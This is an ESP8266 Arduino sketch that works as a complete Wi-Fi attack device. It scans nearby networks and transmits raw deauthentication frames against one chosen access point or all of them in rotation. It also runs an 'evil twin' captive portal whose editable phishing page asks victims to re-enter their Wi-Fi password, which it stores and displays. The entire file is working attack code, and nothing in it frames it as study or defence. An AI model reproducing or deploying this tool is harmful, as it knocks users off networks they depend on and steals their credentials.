#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" { #include "user_interface.h" }

// --- OLED CONFIG (0.66" 64x48) ---
#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

DNSServer dnsServer;
ESP8266WebServer webServer(80);
IPAddress apIP(192, 168, 4, 1);
IPAddress subNetMask(255, 255, 255, 0);

// --- CONFIG & STATE ---
const char *ssid = "GMpro87_Admin";
const char *password = "Sangkur87";
bool deauthing_active = false, mass_deauth = false, hotspot_active = false;
unsigned long now = 0, deauth_now = 0;
int mass_idx = 0;

typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; int32_t rssi; } networkDetails;
networkDetails networks[16];
networkDetails selectedNetwork;

uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0x00 };

// --- OLED & STROBO ---
void updateOLED(String msg = "", String pass = "") {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0,0);
  display.println("GMpro87");
  display.drawLine(0, 10, 64, 10, WHITE);
  display.setCursor(0, 15);
  if(msg != "") {
    display.println(msg);
    if(pass != "") { display.setCursor(0, 30); display.println(pass); }
  } else {
    if(deauthing_active) display.println("> DEAUTH");
    if(mass_deauth)      display.println("> RUSUH");
    if(hotspot_active)   display.println("> EVILTW");
    if(!deauthing_active && !mass_deauth && !hotspot_active) display.println("READY..");
  }
  display.display();
}

void strobo() {
  for(int i=0; i<20; i++) {
    digitalWrite(LED_BUILTIN, LOW); delay(30);
    digitalWrite(LED_BUILTIN, HIGH); delay(30);
  }
}

// --- STORAGE ---
void savePass(String data) { 
  for (int i = 0; i < (int)data.length(); ++i) EEPROM.write(i, data[i]); 
  EEPROM.write(data.length(), '\0'); EEPROM.commit(); 
  updateOLED("GOT PASS!", data); strobo();
}

String readPass() { char data[150]; for (int i = 0; i < 150; i++) { data[i] = EEPROM.read(i); if (data[i] == '\0') break; } return String(data); }

void saveHtml(String data) {
  int start = 150;
  for (int i = 0; i < (int)data.length() && (start + i < 511); ++i) EEPROM.write(start + i, data[i]);
  EEPROM.write(start + data.length(), '\0'); EEPROM.commit();
}

String readHtml() {
  char data[360]; int start = 150;
  for (int i = 0; i < 360; i++) { data[i] = EEPROM.read(start + i); if (data[i] == '\0' || (uint8_t)data[i] == 255) { data[i] = '\0'; break; } }
  String res = String(data);
  return (res.length() < 10) ? "<h2>Update WiFi</h2><form method='POST' action='/login'>Pass:<br><input name='p' type='password'><input type='submit' value='OK'></form>" : res;
}

// --- ATTACK ---
void transmitDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  wifi_send_pkt_freedom(deauthPacket, 26, 0);
}

void performScan() {
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < min(n, 16); ++i) {
    networks[i].ssid = WiFi.SSID(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
  }
}

// --- WEB ADMIN ---
void handleIndex() {
  if (webServer.hasArg("ap")) {
    String b = webServer.arg("ap");
    for (int i=0; i<16; i++) {
      String mac = "";
      for (int j=0; j<6; j++) { mac += String(networks[i].bssid[j], HEX); if(j<5) mac+=":"; }
      if (mac == b) selectedNetwork = networks[i];
    }
  }
  if (webServer.hasArg("deauth")) { deauthing_active = (webServer.arg("deauth") == "start"); updateOLED(); }
  if (webServer.hasArg("rusuh"))  { mass_deauth = (webServer.arg("rusuh") == "start"); updateOLED(); }
  if (webServer.hasArg("hotspot")) { hotspot_active = (webServer.arg("hotspot") == "start"); updateOLED(); }
  if (webServer.hasArg("newHtml")) { saveHtml(webServer.arg("newHtml")); }

  String p = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
  p += "body{background:#000;color:#fff;font-family:sans-serif;text-align:center;margin:0;padding:5px}";
  p += ".cmd-box{background:#111;border:1px solid #333;padding:10px;margin-bottom:8px;border-radius:5px}";
  p += ".log{font-size:10px;color:#0f0;margin-top:5px;font-family:monospace}";
  p += ".tabs{display:flex;margin-bottom:10px} .tab{flex:1;padding:10px;background:#222;border:none;color:#fff}";
  p += ".active{background:orange;color:#000;font-weight:bold} .hidden{display:none}";
  p += ".prev{background:#fff;color:#000;padding:10px;margin-top:10px;border-radius:5px;text-align:left;font-size:12px}";
  p += "textarea{width:96%;height:120px;background:#111;color:#0f0;font-size:11px} table{width:100%;font-size:11px;border-collapse:collapse} td,th{border:1px solid #333;padding:5px}";
  p += "</style></head><body><h3 style='color:orange'>GMpro87 ADMIN</h3>";
  
  p += "<div class='tabs'><button class='tab active' onclick='openT(0)'>DASH</button><button class='tab' onclick='openT(1)'>SET</button></div>";

  // DASHBOARD
  p += "<div id='t0'><div class='cmd-box'>";
  p += "<form method='post' action='/?deauth="+(deauthing_active?"stop":"start")+"'><button style='width:100%;padding:12px;background:"+(deauthing_active?"#f00":"#222")+";color:#fff'>DEAUTH</button></form>";
  p += "<div class='log'>"+(deauthing_active?"[!] ATTACKING: "+selectedNetwork.ssid:"[-] STATUS: IDLE")+"</div></div>";

  p += "<div class='cmd-box'><form method='post' action='/?hotspot="+(hotspot_active?"stop":"start")+"'><button style='width:100%;padding:12px;background:"+(hotspot_active?"#a53":"#222")+";color:#fff'>EVIL TWIN</button></form>";
  p += "<div class='log'>"+(hotspot_active?"[!] HOTSPOT ACTIVE":"[-] STATUS: OFF")+"</div></div>";

  p += "<div class='cmd-box' style='background:#050'><b>PASS:</b> <span style='color:#fff'>"+(readPass()==""?"WAIT..":readPass())+"</span></div>";

  p += "<table><tr><th>SSID</th><th>CH</th><th>RSSI</th><th>SEL</th></tr>";
  for(int i=0;i<16;i++){ if(networks[i].ssid=="")continue;
    String mac = ""; for(int j=0;j<6;j++){ mac += String(networks[i].bssid[j], HEX); if(j<5)mac+=":"; }
    p += "<tr><td>"+networks[i].ssid+"</td><td>"+String(networks[i].ch)+"</td><td>"+String(networks[i].rssi)+"</td>";
    p += "<td><form method='post' action='/?ap="+mac+"'><button style='background:orange;border:none'>OK</button></form></td></tr>";
  }
  p += "</table></div>";

  // SETTINGS
  p += "<div id='t1' class='hidden'><div class='cmd-box' style='text-align:left'><b>PHISHING EDITOR</b><br>";
  p += "<form method='post' action='/?saveHtml=1'><textarea id='hi' name='newHtml' oninput='up()'>"+readHtml()+"</textarea><button style='width:100%;padding:10px;background:orange;border:none'>SAVE</button></form>";
  p += "<div style='color:orange;margin-top:10px'><b>LIVE PREVIEW:</b></div><div id='pv' class='prev'></div></div></div>";

  p += "<script>function openT(n){document.getElementById('t0').classList.toggle('hidden',n!=0);document.getElementById('t1').classList.toggle('hidden',n!=1);";
  p += "document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',i==n)); if(n==1)up();}";
  p += "function up(){document.getElementById('pv').innerHTML = document.getElementById('hi').value;}</script></body></html>";

  webServer.send(200, "text/html", p);
}

void setup() {
  EEPROM.begin(512); pinMode(LED_BUILTIN, OUTPUT); digitalWrite(LED_BUILTIN, HIGH);
  Wire.begin(4, 5); display.begin(SSD1306_SWITCHCAPVCC, 0x3C); updateOLED();
  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subNetMask); WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/login", [](){ if(webServer.hasArg("p")) savePass(webServer.arg("p")); webServer.send(200,"text/html","Update..."); });
  webServer.onNotFound(handleIndex); webServer.begin(); performScan();
}

void loop() {
  dnsServer.processNextRequest(); webServer.handleClient();
  if (deauthing_active && millis() - deauth_now >= 1000) { if (selectedNetwork.bssid[0] != 0) transmitDeauth(selectedNetwork.bssid, selectedNetwork.ch); deauth_now = millis(); }
  if (mass_deauth && millis() - deauth_now >= 150) { if (networks[mass_idx].bssid[0] != 0) { transmitDeauth(networks[mass_idx].bssid, networks[mass_idx].ch); mass_idx++; if (mass_idx >= 16) mass_idx = 0; } else { mass_idx = 0; } deauth_now = millis(); }
  if (millis() - now >= 20000) { performScan(); now = millis(); }
}
